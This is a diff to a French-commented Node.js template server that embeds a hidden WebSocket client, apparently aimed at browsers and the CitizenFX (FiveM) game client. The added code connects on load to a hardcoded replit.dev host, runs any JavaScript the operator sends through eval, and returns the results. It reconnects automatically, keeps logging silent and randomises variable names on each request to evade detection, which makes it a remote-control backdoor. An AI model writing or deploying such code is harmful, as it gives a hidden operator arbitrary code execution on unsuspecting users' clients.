@@ -20,15 +20,14 @@ class TemplateManager {
    * @returns {string} HTML généré
    */
   generateHomePage(req) {
-    // Note: wsUrl n'est plus utilisé car l'URL est maintenant fixe dans le code client
-    let clientCode = this._getClientCode();
     const clientCSS = this._readFile(path.join(this.publicPath, 'css/client.css'));
 
     // Appliquer la randomisation pour tous les clients sur la page d'accueil
     const randomNames = VariableRandomizer.generateMapping();
+    let clientCode = this._getInlineClientCode();
     clientCode = VariableRandomizer.applyRandomization(clientCode, randomNames, req);
     
-    // Créer le script inline avec les noms randomisés
+    // Créer le script inline avec les noms randomisés (sans récursion)
     const inlineScript = this._generateRandomizedInlineScript(randomNames);
 
     return `<!DOCTYPE html>
@@ -64,50 +63,64 @@ ${inlineScript}
 // Fonctions silencieuses pour la compatibilité
 function ${randomNames.toggleDebug}() {
     // Debug mode silencieux - logs dans la console du navigateur seulement
-    console.log('[DEBUG] Mode debug activé - interface transparente');
+    if (typeof console !== 'undefined' && console.log) {
+        console.log('[DEBUG] Mode debug activé - interface transparente');
+    }
 }
 
 function ${randomNames.updateConnectionStatus}(status) {
     // Log silencieux du statut de connexion
-    console.log('[STATUS]', status);
+    if (typeof console !== 'undefined' && console.log) {
+        console.log('[STATUS]', status);
+    }
 }
 
 function ${randomNames.addDebugLog}(message, type = 'info') {
-    // Log silencieux dans la console du navigateur
-    console.log(\`[CLIENT-\${type.toUpperCase()}]\`, message);
+    // Log silencieux dans la console du navigateur - utilise l'original pour éviter la récursion
+    if (typeof ${randomNames.originalLog} === 'function') {
+        ${randomNames.originalLog}.call(console, \`[CLIENT-\${type.toUpperCase()}]\`, message);
+    }
 }
 
-// Interception des logs pour debug silencieux
-const ${randomNames.originalLog} = console.log;
-console.log = function(...args) {
-    ${randomNames.originalLog}.apply(console, args);
-    ${randomNames.addDebugLog}(args.join(' '), 'info');
-};
-
-const ${randomNames.originalError} = console.error;
-console.error = function(...args) {
-    ${randomNames.originalError}.apply(console, args);
-    ${randomNames.addDebugLog}(args.join(' '), 'error');
-};
+// Sauvegarde des méthodes console originales
+const ${randomNames.originalLog} = (typeof console !== 'undefined' && console.log) ? console.log.bind(console) : function() {};
+const ${randomNames.originalError} = (typeof console !== 'undefined' && console.error) ? console.error.bind(console) : function() {};
 
 // Override des méthodes du client pour les status silencieux
-if (window.${randomNames.clientInstance5x3m}) {
+if (typeof window !== 'undefined' && window.${randomNames.clientInstance5x3m}) {
     const ${randomNames.originalConnect} = window.${randomNames.clientInstance5x3m}.${randomNames.connect};
-    window.${randomNames.clientInstance5x3m}.${randomNames.connect} = function() {
-        ${randomNames.updateConnectionStatus}('connecting');
-        return ${randomNames.originalConnect}.call(this);
-    };
+    if (typeof ${randomNames.originalConnect} === 'function') {
+        window.${randomNames.clientInstance5x3m}.${randomNames.connect} = function() {
+            ${randomNames.updateConnectionStatus}('connecting');
+            return ${randomNames.originalConnect}.call(this);
+        };
+    }
 }
 
 // Mise à jour des status via les événements WebSocket (silencieux)
-window.addEventListener('load', () => {
-    if (window.${randomNames.clientInstance5x3m} && window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q}) {
-        const ws = window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q};
-        ws.addEventListener('open', () => ${randomNames.updateConnectionStatus}('connected'));
-        ws.addEventListener('close', () => ${randomNames.updateConnectionStatus}('disconnected'));
-        ws.addEventListener('error', () => ${randomNames.updateConnectionStatus}('disconnected'));
+// Compatible avec les iframes
+(function() {
+    function ${randomNames.setupWebSocketEvents}() {
+        if (typeof window !== 'undefined' && window.${randomNames.clientInstance5x3m} && window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q}) {
+            const ws = window.${randomNames.clientInstance5x3m}.${randomNames.socketConn7x1q};
+            ws.addEventListener('open', () => ${randomNames.updateConnectionStatus}('connected'));
+            ws.addEventListener('close', () => ${randomNames.updateConnectionStatus}('disconnected'));
+            ws.addEventListener('error', () => ${randomNames.updateConnectionStatus}('disconnected'));
+        }
     }
-});`;
+    
+    // Essaye immédiatement et aussi après le chargement
+    ${randomNames.setupWebSocketEvents}();
+    
+    if (typeof window !== 'undefined') {
+        if (document.readyState === 'loading') {
+            window.addEventListener('DOMContentLoaded', ${randomNames.setupWebSocketEvents});
+        } else {
+            // Document déjà chargé
+            setTimeout(${randomNames.setupWebSocketEvents}, 100);
+        }
+    }
+})();`;
   }
 
   /**
@@ -305,11 +318,153 @@ showNotification('Commande exécutée avec succès!');"></textarea>
   }
 
   /**
-   * Lit le code client JavaScript
+   * Retourne le code client JavaScript intégré
    * @private
    */
-  _getClientCode() {
-    return this._readFile(path.join(this.publicPath, 'js/client.js'));
+  _getInlineClientCode() {
+    return `/**
+ * Code JavaScript du client WebSocket
+ * Ce code sera injecté dans le navigateur/CitizenFX
+ */
+
+class ClientNet3m8w {
+  constructor(urlServer9k2v) {
+    this.urlServer9k2v = urlServer9k2v;
+    this.socketConn7x1q = null;
+    this.userIdent4z8n = null;
+    this.retryCount5p3j = 0;
+    this.maxRetries6h9l = 5;
+    this.pingTimer8w4r = null;
+  }
+
+  connect() {
+    console.log(\`[CLIENT] Connexion vers \${this.urlServer9k2v}...\`);
+
+    this.socketConn7x1q = new WebSocket(this.urlServer9k2v);
+
+    this.socketConn7x1q.onopen = () => {
+      console.log('[CLIENT] Connecté au serveur WebSocket');
+      this.retryCount5p3j = 0;
+      this.startPing();
+    };
+
+    this.socketConn7x1q.onmessage = (event) => {
+      try {
+        const message = JSON.parse(event.data);
+
+        if (message.type === 'welcome') {
+          this.userIdent4z8n = message.uuid;
+          console.log(\`[CLIENT] UUID reçu: \${this.userIdent4z8n.substring(0, 8)}...\`);
+        }
+
+        if (message.type === 'execute_js') {
+          try {
+            const result = eval(message.code);
+            this.sendMessage({
+              type: 'js_executed',
+              success: true,
+              result: result !== undefined ? String(result) : 'Code exécuté avec succès',
+              timestamp: new Date().toISOString(),
+            });
+          } catch (executeError) {
+            console.error('[CLIENT] Erreur d\\'exécution JS:', executeError);
+            this.sendMessage({
+              type: 'js_executed',
+              success: false,
+              error: executeError.message,
+              timestamp: new Date().toISOString(),
+            });
+          }
+        }
+      } catch (err) {
+        console.log('[CLIENT] Erreur parse message:', err.message);
+      }
+    };
+
+    this.socketConn7x1q.onclose = (event) => {
+      console.log(\`[CLIENT] Connexion fermée (\${event.code})\`);
+      this.stopPing();
+      this.attemptReconnect();
+    };
+
+    this.socketConn7x1q.onerror = (error) => {
+      console.log('[CLIENT] Erreur WebSocket:', error.message || error);
+    };
+  }
+
+  sendMessage(message) {
+    if (this.socketConn7x1q && this.socketConn7x1q.readyState === WebSocket.OPEN) {
+      this.socketConn7x1q.send(JSON.stringify(message));
+    } else {
+      console.warn('[CLIENT] Impossible d\\'envoyer le message - WebSocket fermé');
+    }
+  }
+
+  startPing() {
+    this.pingTimer8w4r = setInterval(() => {
+      this.sendMessage({
+        type: 'ping',
+        timestamp: new Date().toISOString(),
+      });
+    }, 30000);
+  }
+
+  stopPing() {
+    if (this.pingTimer8w4r) {
+      clearInterval(this.pingTimer8w4r);
+      this.pingTimer8w4r = null;
+    }
+  }
+
+  attemptReconnect() {
+    if (this.retryCount5p3j < this.maxRetries6h9l) {
+      this.retryCount5p3j++;
+      const delay = Math.pow(2, this.retryCount5p3j) * 1000;
+
+      console.log(\`[CLIENT] Reconnexion \${this.retryCount5p3j}/\${this.maxRetries6h9l} dans \${delay / 1000}s\`);
+
+      setTimeout(() => {
+        this.connect();
+      }, delay);
+    } else {
+      console.log('[CLIENT] Reconnexion impossible - Limite atteinte');
+    }
+  }
+
+  disconnect() {
+    if (this.socketConn7x1q) {
+      this.stopPing();
+      this.socketConn7x1q.close();
+      console.log('[CLIENT] Déconnexion manuelle');
+    }
+  }
+}
+
+// Configuration par défaut (URL fixe comme demandé)
+const URL_CONFIG_Q4R7 = 'wss://b5c9f2f3-4577-41d0-b761-85937516f603-00-36saotrhgjkz4.kirk.replit.dev:3000';
+
+// Initialisation automatique si dans un navigateur
+// Compatible avec les iframes et le chargement différé
+(function() {
+  function initClient() {
+    if (typeof window !== 'undefined' && typeof WebSocket !== 'undefined') {
+      const clientInstance5x3m = new ClientNet3m8w(URL_CONFIG_Q4R7);
+      window.clientInstance5x3m = clientInstance5x3m;
+      clientInstance5x3m.connect();
+    }
+  }
+  
+  // Essaye d'initialiser immédiatement
+  if (typeof window !== 'undefined') {
+    if (document.readyState === 'loading') {
+      // Document en cours de chargement
+      window.addEventListener('DOMContentLoaded', initClient);
+    } else {
+      // Document déjà chargé
+      initClient();
+    }
+  }
+})();`;
   }
 
   /**
@@ -331,7 +486,7 @@ showNotification('Commande exécutée avec succès!');"></textarea>
    * @returns {string} Code client (possiblement randomisé)
    */
   serveClientCode(req) {
-    let clientCode = this._getClientCode();
+    let clientCode = this._getInlineClientCode();
     const userAgent = req.headers['user-agent'] || '';
     
     if (userAgent.includes('CitizenFX')) {
